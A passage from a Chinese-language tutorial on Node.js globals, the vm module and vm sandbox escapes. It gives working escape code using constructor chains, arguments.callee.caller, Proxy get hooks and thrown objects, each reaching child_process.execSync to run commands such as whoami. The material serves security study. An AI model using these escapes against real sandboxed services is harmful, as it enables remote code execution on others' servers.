对象，那么在服务端的Nodejs中和<code>window</code>类似的全局对象叫做<code>global</code>。在 Node.js 中，最顶层的全局对象是 global，Nodejs下其他的所有属性和包都挂载在这个global对象下。</p><p>在global下挂载了一些全局变量，我们在访问这些全局变量时不需要用<code>global.xxx</code>的方式来访问，直接用<code>xxx</code>就可以调用这个变量。举个例子，<code>console</code>就是挂载在global下的一个全局变量，我们在用<code>console.log</code>输出时并不需要写成<code>global.console.log</code>，其他常见全局变量还有process（一会逃逸要用到）。</p><p>我们也可以手动声明一个全局变量，但全局变量在每个包中都是共享的，所以尽量不要声明全局变量，不然容易导致变量污染。用上面的代码举个例子：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span><span class="hljs-selector-class">.js</span><br>global<span class="hljs-selector-class">.age</span> = <span class="hljs-number">20</span><br><br><br><span class="hljs-number">2</span><span class="hljs-selector-class">.js</span><br>const <span class="hljs-selector-tag">a</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./y1&quot;</span>)<br>console<span class="hljs-selector-class">.log</span>(age)<br></code></pre></td></tr></table></figure><p>输出：</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132248414.png" alt="image-20250705231543059"></p><p>可以发现我这次在1.js中并没有使用<code>exports</code>将age导入，并且2.js在输出时也没有用<code>a.age</code>，因为此时age已经挂载在global上了，它的作用域已经不在1.js中了。</p><h3 id="vm沙箱"><a href="#vm沙箱" class="headerlink" title="vm沙箱"></a>vm沙箱</h3><p><strong>vm模块的常用API</strong></p><p>我们在前面提到了作用域这个概念，所以我们现在思考一下，如果想要实现沙箱的隔离作用，我们是不是可以创建一个新的作用域，让代码在这个新的作用域里面去运行，这样就和其他的作用域进行了隔离，这也就是vm模块运行的原理，先来了解几个常用的vm模块的API。</p><ol><li><code>vm.createContext([sandbox][, options])</code></li></ol><p>在使用前需要先创建一个沙箱对象，再将沙箱对象传给该方法（如果没有则会生成一个空的沙箱对象），v8为这个沙箱对象在当前global外再创建一个作用域，此时这个沙箱对象就是这个作用域的全局对象，沙箱内部无法访问global中的属性。</p><p>例：<code>const context = vm.createContext(&#123; a: 1 &#125;)</code></p><ol start="2"><li><code>vm.runInContext(code, context[, options])</code></li></ol><p>参数为要执行的代码和创建完作用域的沙箱对象，代码会在传入的沙箱对象的上下文中执行，并且参数的值与沙箱内的参数值相同。</p><p>例：<code>vm.runInContext(&#39;a = a + 1&#39;, context)</code></p><p>我们用代码演示一下上面两个api</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>);<br><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-variable language_">global</span>.<span class="hljs-property">globalVar</span> = <span class="hljs-number">3</span>;<br><span class="hljs-keyword">const</span> sandbox = &#123; <span class="hljs-attr">globalVar</span>: <span class="hljs-number">1</span> &#125;;<br>vm.<span class="hljs-title function_">createContext</span>(sandbox);<br>vm.<span class="hljs-title function_">runInContext</span>(<span class="hljs-string">&#x27;globalVar *= 2;&#x27;</span>, sandbox);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-title function_">inspect</span>(sandbox)); <span class="hljs-comment">// &#123; globalVar: 2 &#125;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-title function_">inspect</span>(globalVar)); <span class="hljs-comment">// 3</span><br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132248406.png" alt="image-20250706134614052" style="zoom: 33%;" /><ol start="3"><li><code>vm.runInNewContext(code[, sandbox][, options])</code></li></ol><p>creatContext和runInContext的结合版，传入要执行的代码和沙箱对象。</p><p>例：<code>vm.runInNewContext(&#39;a = a + 1&#39;, &#123; a: 1 &#125;)</code></p><ol start="4"><li><code>vm.runInThisContext(code[, options])</code></li></ol><p>在当前global下创建一个作用域（sandbox），并将接收到的参数当作代码运行。sandbox中可以能访问和修改全局变量，但不会污染外部作用域（这里的“外部作用域”指的不是“全局作用域”，而是当前函数或模块的局部变量作用域）</p><ul><li><strong>能访问和修改全局变量</strong>（如 <code>global.foo</code>、全局对象、Node.js 内建全局）。</li><li><strong>不能访问当前函数或模块里的局部变量</strong>，也不能声明变量后让外部直接访问。</li></ul><p>举例，</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-keyword">let</span> localVar = <span class="hljs-string">&#x27;initial value&#x27;</span>;<br><span class="hljs-keyword">const</span> vmResult = vm.<span class="hljs-title function_">runInThisContext</span>(<span class="hljs-string">&#x27;localVar = &quot;vm&quot;;&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;vmResult:&#x27;</span>, vmResult);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;localVar:&#x27;</span>, localVar);<br><span class="hljs-comment">// vmResult: &#x27;vm&#x27;, localVar: &#x27;initial value&#x27;</span><br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132248223.png" alt="image-20250706134614052" style="zoom:50%;" /><ol start="5"><li>vm.Script类</li></ol><p><code>vm.Script</code> 是 Node.js <code>vm</code> 模块中的一个类。它代表<strong>一段预编译的 JavaScript 脚本</strong>，你可以用它在不同的上下文（沙箱）中多次、高效地执行同一段代码。和 <code>eval</code> 不同，<code>vm.Script</code> 支持预编译与复用，也不绑定当前作用域。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">new</span> <span class="hljs-keyword">vm</span>.Script(code[, <span class="hljs-keyword">options</span>])<br>创建一个新的<span class="hljs-keyword">vm</span>.Script对象只编译代码但不会执行它。编译过的<span class="hljs-keyword">vm</span>.Script此后可以被多次执行。值得注意的是，code是不绑定于任何全局对象的，相反，它仅仅绑定于每次执行它的对象。<br><br>script.runInContext(context[, <span class="hljs-keyword">options</span>])<br>    在指定的上下文（沙箱）中执行脚本。<br>    context 必须用 <span class="hljs-keyword">vm</span>.createContext() 创建。<br>    执行时，每次都用新的上下文变量。<br><br>script.runInNewContext([<span class="hljs-keyword">sandbox</span>][, <span class="hljs-keyword">options</span>])<br>    在新建的沙箱环境中执行脚本。<br>    <span class="hljs-keyword">sandbox</span> 是本次执行的上下文对象。<br><br>script.runInThisContext([<span class="hljs-keyword">options</span>]<br>    在当前全局上下文中执行脚本。<br>    代码可访问全局（<span class="hljs-keyword">global</span>）变量，但与本地作用域隔离。<br><br></code></pre></td></tr></table></figure><p>例，</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><br><span class="hljs-comment">// 编译代码</span><br><span class="hljs-keyword">const</span> script = <span class="hljs-keyword">new</span> vm.<span class="hljs-title class_">Script</span>(<span class="hljs-string">&#x27;a += 10&#x27;</span>);<br><br><span class="hljs-comment">// 创建两个上下文</span><br><span class="hljs-keyword">const</span> context1 = vm.<span class="hljs-title function_">createContext</span>(&#123; <span class="hljs-attr">a</span>: <span class="hljs-number">1</span> &#125;);<br><span class="hljs-keyword">const</span> context2 = vm.<span class="hljs-title function_">createContext</span>(&#123; <span class="hljs-attr">a</span>: <span class="hljs-number">100</span> &#125;);<br><br><span class="hljs-comment">// 在不同上下文多次运行</span><br>script.<span class="hljs-title function_">runInContext</span>(context1);<br>script.<span class="hljs-title function_">runInContext</span>(context2);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(context1.<span class="hljs-property">a</span>); <span class="hljs-comment">// 11</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(context2.<span class="hljs-property">a</span>); <span class="hljs-comment">// 110</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132248856.png" alt="image-20250706134614052"></p><h2 id="vm沙箱逃逸"><a href="#vm沙箱逃逸" class="headerlink" title="vm沙箱逃逸"></a>vm沙箱逃逸</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>沙箱逃逸的前提是：我们可以从沙箱内部通过属性或者方法或者其他方式访问到沙箱外部</p><p>我们执行m+n这个表达式：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>) <span class="hljs-comment">//这是一个沙箱环境</span><br><span class="hljs-keyword">const</span> script = <span class="hljs-string">`m+n`</span> <span class="hljs-comment">//这里就是要在沙箱中执行的脚本</span><br><span class="hljs-keyword">const</span> sandbox = &#123; <span class="hljs-attr">m</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">n</span>: <span class="hljs-number">2</span> &#125; <span class="hljs-comment">//这里是具体执行的值</span><br><span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> vm.<span class="hljs-title function_">createContext</span>(sandbox) <span class="hljs-comment">//创建一个沙箱环境上下文</span><br><span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(script, sandbox) <span class="hljs-comment">//这里将脚本和执行的值在沙箱环境上下文中运行</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res); <span class="hljs-comment">//打印值</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132248177.png" alt="image-20250706201546522"></p><p>成功的在沙箱中执行了脚本，并且返回了执行的结果。</p><p>这个环境中上下文有三个对象：</p><blockquote><p><code>this</code> 指向传入的 sandbox 对象。你传给 <code>vm.createContext</code> 的对象就是沙箱的“全局对象”，里面的属性（m、n）就是沙箱中的变量，而<code>this</code> 在沙箱代码中指向这个对象，你可以通过 <code>m</code>, <code>n</code>, <code>this.m</code>, <code>this.n</code> 在沙箱里访问这两个变量。</p><p>m等于数字1</p><p>n等于数字2</p></blockquote><p>一般进行沙箱逃逸最后都是进行rce，那么在Node里要进行rce就需要procces了。在获取到process对象后，我们就可以用require来导入child_process，再利用child_process执行命令。</p><p>但process挂载在global上，我们上面说了在<code>creatContext</code>后是不能访问到global的，所以我们最终的目标是通过各种办法将global上的process引入到沙箱中。</p><p>我们可以使用传入的对象（比如this）来引入沙箱外部模块，从而拿到process，比如（code参数最好用反引号包裹，这样可以使code更严格便于执行）：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">const</span> vm = require(<span class="hljs-string">&#x27;vm&#x27;</span>) <span class="hljs-comment">//这是一个沙箱环境</span><br><span class="hljs-keyword">const</span> script = `<br><span class="hljs-keyword">const</span> process = <span class="hljs-keyword">this</span>.<span class="hljs-keyword">constructor</span>.<span class="hljs-keyword">constructor</span>(<span class="hljs-string">&#x27;return process&#x27;</span>) ()<br>process.mainModule.require(<span class="hljs-string">&#x27;child_process&#x27;</span>).execSync(<span class="hljs-string">&#x27;whoami&#x27;</span>).toString()<br>`<br><span class="hljs-keyword">const</span> sandbox = &#123; m: <span class="hljs-number">1</span>, n: <span class="hljs-number">2</span> &#125; <span class="hljs-comment">//这里是具体执行的值</span><br><span class="hljs-keyword">const</span> context = new vm.createContext(sandbox) <span class="hljs-comment">//创建一个沙箱环境上下文</span><br><span class="hljs-keyword">const</span> res = vm.runInContext(script, sandbox) <span class="hljs-comment">//这里将脚本和执行的值在沙箱环境上下文中运行</span><br>console.log(res); <span class="hljs-comment">//打印值</span><br></code></pre></td></tr></table></figure><p>那么我们是怎么实现逃逸的呢，首先我们提到过this指向的是当前传递给<code>createContext</code>的对象，这个对象是不属于沙箱环境的，我们通过这个对象获取到它的构造器，再获得一个构造器对象的构造器（此时为Function的constructor），最后的<code>()</code>是调用这个用Function的constructor生成的函数，最终返回了一个process对象。</p><p>下面这行代码也可以获得process对象：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> process = <span class="hljs-variable language_">this</span>.<span class="hljs-property">toString</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;return process&#x27;</span></span>)(<span class="hljs-params"></span>)<br></code></pre></td></tr></table></figure><p>this.toString获取到一个函数对象，this.toString.constructor获取到函数对象的构造器，构造器中可以传入字符串类型的代码，然后再执行，即可获得process对象。</p><p>那么问题就来了！</p><p>1、为什么不直接使用<code>&#123;&#125;.toString.constructor(&#39;return process&#39;)()</code>，却要使用this呢？</p><p>{}的意思是在沙箱内声明了一个对象。</p><p>这两个的一个重要区别就是，{}是在沙盒内的一个对象，而this是在沙盒外的对象（注入进来的）。沙盒内的对象即使使用这个方法，也获取不到process，因为它本身就没有process。</p><p>2、m和n也是沙盒外的对象，为什么不用<code>m.toString.constructor(&#39;return process&#39;)()</code>呢？</p><p>因为数字、字符串、布尔等这些都是primitive types，他们的传递其实传递的是值而不是引用，所以在沙盒内虽然你也是使用的m，但是这个m和外部那个m已经不是一个m了，所以也是无法利用的。</p><p>所以，我们将mn改成其他类型就可以利用了：<code>context：&#123;m: [], n: &#123;&#125;, x: /regexp/&#125;</code></p><p>那么我们就可以总结一下沙箱绕过的核心原理：</p><blockquote><p> 只要在沙箱内部，找到一个沙箱外部的对象，借助这个对象内的属性即可获得沙箱外的函数，进而绕过沙箱。</p></blockquote><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p><strong>方法1，利用Function构造函数沙箱逃逸，执行命令</strong></p><p>利用引用类型：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">vm</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>) <span class="hljs-comment">//这是一个沙箱环境</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">script</span> = `<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">process</span> = x.toString.<span class="hljs-title function_ invoke__">constructor</span>(<span class="hljs-string">&#x27;return process&#x27;</span>) ()<br>process.mainModule.<span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_ invoke__">execSync</span>(<span class="hljs-string">&#x27;ipconfig&#x27;</span>).<span class="hljs-title function_ invoke__">toString</span>()<br>`<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">sandbox</span> = &#123; m: [], n: &#123;&#125;, x: /regexp/ &#125; <span class="hljs-comment">//</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">context</span> = <span class="hljs-keyword">new</span> vm.<span class="hljs-title function_ invoke__">createContext</span>(sandbox) <span class="hljs-comment">//创建一个沙箱环境上下文</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">res</span> = vm.<span class="hljs-title function_ invoke__">runInContext</span>(script, sandbox) <span class="hljs-comment">//这里将脚本和执行的值在沙箱环境上下文中运行</span><br>console.<span class="hljs-title function_ invoke__">log</span>(res); <span class="hljs-comment">//打印值</span><br></code></pre></td></tr></table></figure><p>上面通过新建了一个 process，将通过x.tostring.constructor拿到的process模块，这时的sandbox中的数值是任意的引用类型</p><p>然后通过拿到的process.mainMoudule.require方法，拿到c’child_process’子模块，然后通过exec.Sync方法执行我们的命令</p><p>这样就成功的利用了沙箱逃逸实现了任意命令执行，虽然出现了乱码，但是不影响我们的命令执行</p><p>利用this（这里与原理里的实例一致）： </p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">const</span> vm = require(<span class="hljs-string">&#x27;vm&#x27;</span>) <span class="hljs-comment">//这是一个沙箱环境</span><br><span class="hljs-keyword">const</span> script = <br>`<br><span class="hljs-keyword">const</span> process = <span class="hljs-keyword">this</span>.<span class="hljs-keyword">constructor</span>.<span class="hljs-keyword">constructor</span>(<span class="hljs-string">&#x27;return process&#x27;</span>) ()<br>process.mainModule.require(<span class="hljs-string">&#x27;child_process&#x27;</span>).execSync(<span class="hljs-string">&#x27;ls&#x27;</span>).toString()<br>` <span class="hljs-comment">//这样我们就拿到了Function构造函数了，拿到了process模块，调用process子模块，然后通过调用process的方法来实现任意命令执行</span><br><span class="hljs-keyword">const</span> sandbox = &#123; m:<span class="hljs-number">1</span>, n:<span class="hljs-number">2</span> &#125; <span class="hljs-comment">//</span><br><span class="hljs-keyword">const</span> context = new vm.createContext(sandbox) <span class="hljs-comment">//创建一个沙箱环境上下文</span><br><span class="hljs-keyword">const</span> res = vm.runInContext(script, sandbox) <span class="hljs-comment">//这里将脚本和执行的值在沙箱环境上下文中运行</span><br>console.log(res); <span class="hljs-comment">//打印值</span><br></code></pre></td></tr></table></figure><p>与利用引用类型不同的是通过 this方法来实现的，将x换位了this，那么这时，sandbox中的值就不要求是一些类型的引用，可以是任意的数值了</p><p><strong>方法2：利用argument.callee.caller实现</strong></p><p>现在如果有一个这样的一个框架如下所示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>); <br><span class="hljs-keyword">const</span> script = <span class="hljs-string">`...`</span>; <br><span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>); <br><span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> vm.<span class="hljs-title function_">createContext</span>(sandbox); <br><span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(script, context); <br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello &#x27;</span> + res) <br></code></pre></td></tr></table></figure><p>在 JavaScript 中，this 关键字的值取决于函数的执行上下文。</p><p>在全局作用域中，this 通常指向全局对象（如浏览器环境中的 window 对象，Node.js 环境中的 global 对象）。但是，在使用 Object.create(null) 创建的对象上下文中，this 将为 null。</p><p><code>const sandbox = Object.create(null);</code></p><p>Object.create(null) 是一个创建一个新对象的方法：</p><p>在 JavaScript 中，Object.create(null) 会创建一个纯净的对象，它没有继承自 Object.prototype 或任何其他原型对象，因此不会拥有默认的原型方法和属性。这样的对象通常被称为“空对象”或“纯净对象”。</p><p>在这个纯净对象 sandbox 上下文中，由于没有原型链，它的 this 值将为 null。</p><p>这时，上面使用this和引用类型的来访问外部模块的方法就没有办法生效了，那么我们就可以通过callee和caller来进行实现</p><p>我们先介绍一下callee和caller这两个属性：</p><blockquote><p> callee 和 caller  都是已经被废弃的属性</p><p> callee，会指向调用函数本身</p><p> caller，会指向谁调用你的函数</p><p>arguments.callee.caller，是一个函数中的内置对象的属性，它可以返回函数的调用者。</p></blockquote><p>沙箱逃逸其实就是找到一个沙箱外的对象，并调用其中的方法。</p><p>这种情况下也是一样的，我们只要在沙箱内定义一个函数，然后在沙箱外调用这个函数，这时我们定义的函数的arguments.callee.caller就会指向外部（指向沙箱外的调用者），然后我们在沙箱内就可以进行逃逸了。</p><p>具体实现：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">vm</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">script</span> = <br>`<br>(()=&gt; &#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">a</span>= &#123;&#125;<br>    a.toString = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">cc</span>= arguments.callee.caller<br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">p</span> =(cc.<span class="hljs-title function_ invoke__">constructor</span>(<span class="hljs-string">&#x27;return process&#x27;</span>))()<br>        <span class="hljs-keyword">return</span> p.mainModule.<span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_ invoke__">execSync</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>).<span class="hljs-title function_ invoke__">toString</span>()<br>    &#125;<br>    <span class="hljs-keyword">return</span> a<br>&#125;)()<br>`;<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">sandbox</span> = Object.<span class="hljs-title function_ invoke__">create</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">context</span> = <span class="hljs-keyword">new</span> vm.<span class="hljs-title function_ invoke__">createContext</span>(sandbox);<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">res</span> = vm.<span class="hljs-title function_ invoke__">runInContext</span>(script, context);<br>console.<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&#x27;hello&#x27;</span> + res); <span class="hljs-comment">//js中某一个东西和字符串拼接，最终的结果是一个字符串</span><br><br></code></pre></td></tr></table></figure><p>分析一下上面代码，我们在沙箱内先创建了一个对象，并且将这个对象的toString方法进行了重写，</p><p>注意沙箱外在console.log中将字符串与运行结果进行了拼接，这样沙箱中代码的最终结果会转换成字符串，沙箱内的a.toString 方法就被外部的toString方法调用</p><p>然后通过<code>arguments.callee.caller</code>获得到沙箱外的toString方法，利用toString方法的构造函数返回了process（这里就和第一种方法原理一致了），再调用process进行rce。</p><p>简单地说，沙箱外在console.log中通过字符串拼接的方式触发了这个重写后的toString函数，而重写的函数里又通过指向其触发者，拿到沙箱外的对象，进一步实现命令执行。</p><p><strong>方法3：利用ES6的 proxy 模式来劫持外部get操作</strong></p><p>上面方法2的前提是打印时，需要与一个字符串拼接的行为，如果沙箱外没有执行字符串的相关操作来触发这个toString，并且也没有可以用来进行恶意重写的函数，怎么逃逸呢</p><p>那么我们可以用<code>Proxy</code>来劫持属性</p><p><strong>Proxy</strong>可理解为：在目标对象前架设一层“拦截”，外界对该对象的访问，都必须先通过这层拦截，相当于对外界的访问进行过滤和改写。</p><p>详见：<a href="https://juejin.cn/post/6844904090116292616">Proxy 和 Reflect一个 Proxy 对象包装另一个对象并拦截诸如读取&#x2F;写入属性和其他操作，可以选择自行处理它 - 掘金</a></p><p>例如，拦截读取属性行为：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">var</span> proxy = <span class="hljs-keyword">new</span> Proxy(&#123;&#125;, &#123;<br>    <span class="hljs-attr">get</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">target, propKey</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">35</span>;<br>    &#125;<br>&#125;);<br><br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(proxy.<span class="hljs-built_in">time</span>);   <span class="hljs-comment">// 35</span><br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(proxy.name);   <span class="hljs-comment">// 35</span><br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(proxy.title);  <span class="hljs-comment">// 35</span><br></code></pre></td></tr></table></figure><p>逃逸方式</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-keyword">const</span> script = <br>`<br>(() =&gt; &#123;<br>    <span class="hljs-keyword">const</span> a = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Proxy</span>(&#123;&#125;,&#123;<br>        get:<span class="hljs-keyword">function</span>()&#123;<br>        <span class="hljs-keyword">const</span> cc = arguments.callee.caller;<br>        <span class="hljs-keyword">const</span> p = (cc.constructor.constructor(<span class="hljs-string">&#x27;return process&#x27;</span>))();<br>        <span class="hljs-keyword">return</span> p.mainModule.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).execSync(<span class="hljs-string">&#x27;whoami&#x27;</span>).toString()<br>        &#125;<br>     &#125;)<br><span class="hljs-keyword">return</span> a &#125;)()<br>`;<br><span class="hljs-regexp">// //</span> 定义代理模式，将代理模式定义为空对象，这个空对象有get方法<br><span class="hljs-keyword">const</span> sandbox = <span class="hljs-built_in">Object</span>.create(<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> vm.createContext(sandbox);<br><span class="hljs-keyword">const</span> res = vm.runInContext(script, context);<br>console.log(res.xxx);<br></code></pre></td></tr></table></figure><p>触发利用链的逻辑就是我们在<code>get:</code>这个钩子里写了一个恶意函数，当我们在沙箱外访问proxy对象的任意属性（不论是否存在）这个钩子就会自动运行，实现了rce。</p><p>如果沙箱的返回值返回的是我们无法利用的对象或者没有返回值应该怎么进行逃逸呢？</p><p>我们可以借助异常，把我们沙箱内的对象抛出去，如果外部有捕捉异常的（如日志）逻辑，则也可能触发漏洞：</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">const vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br>const script = `<span class="language-javascript"><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123;&#125;, &#123; </span><br><span class="language-javascript">    <span class="hljs-attr">get</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; </span><br><span class="language-javascript">     <span class="hljs-keyword">const</span> cc = <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">caller</span>; </span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> p = 